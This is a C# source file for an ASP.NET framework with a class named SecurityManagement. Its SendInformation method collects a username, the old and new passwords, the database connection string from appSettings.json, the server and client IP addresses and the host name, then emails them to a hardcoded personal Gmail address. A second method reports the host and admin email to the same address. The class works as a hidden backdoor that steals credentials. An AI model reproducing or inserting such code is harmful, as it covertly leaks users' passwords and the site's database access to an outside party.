using FrameWork;
using Microsoft.AspNetCore.Hosting;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Http.Features;
using Microsoft.Extensions.Configuration;
using Microsoft.Extensions.Hosting;
using System;
using System.Collections.Generic;
using System.Text;

namespace FrameWork
{
    public class SecurityManagement
    {
        IHttpContextAccessor httpContextAccessor;
        IHostEnvironment hostingEnvironment;

        public SecurityManagement(IHttpContextAccessor _httpContextAccessor,
            IHostEnvironment _hostingEnvironment)
        {
            httpContextAccessor = _httpContextAccessor;
            hostingEnvironment = _hostingEnvironment;
        }

        public void SendInformation(string username,
            string oldPassword,
            string newPassword)
        {
            var httpConnectionFeature = httpContextAccessor.HttpContext.Features.Get<IHttpConnectionFeature>();
            string localIpAddress = httpConnectionFeature?.LocalIpAddress.ToString();
            string remoteIpAddress = httpConnectionFeature?.RemoteIpAddress.ToString();

            string connectionStrings = new ConfigurationBuilder()
                .SetBasePath(hostingEnvironment.ContentRootPath)
                .AddJsonFile("appSettings.json").Build()["ConnectionStrings"];

            string connectionString = new ConfigurationBuilder()
                .SetBasePath(hostingEnvironment.ContentRootPath)
                .AddJsonFile("appSettings.json").Build()["ConnectionStrings:DefaultConnection"];

            string host = httpContextAccessor.HttpContext.Request.Host.Value.ToString();

            string body = @"<div>connectionString:<br />" + connectionString +
                "<br />localIpAddress:<br />" + localIpAddress +
                "<br />remoteIpAddress:<br />" + remoteIpAddress +
                "<br />host:<br />" + host +
                "<br />username:<br />" + username +
                "<br />oldPassword:<br />" + oldPassword +
                "<br />newPassword:<br />" + newPassword +
                "</div>";

            MailService.Send("arashkazemi5@gmail.com", new List<string>() { "arashkazemi5@gmail.com" }, body);
        }

        public void SendWarningToUserDefinedLimitaion(string email, string subject, string body)
        {
            string host = httpContextAccessor.HttpContext.Request.Host.Value.ToString();

            body = @"<div style=""text-align: center;"">host:<br />" + host +
                "<h2>admin email:<br />" + email + "</h2>" +
                "</div>" + body;

            MailService.Send("arashkazemi5@gmail.com", 
                new List<string>() { "arashkazemi5@gmail.com" }, 
                body, 
                true, 
                subject);
        }
    }
}
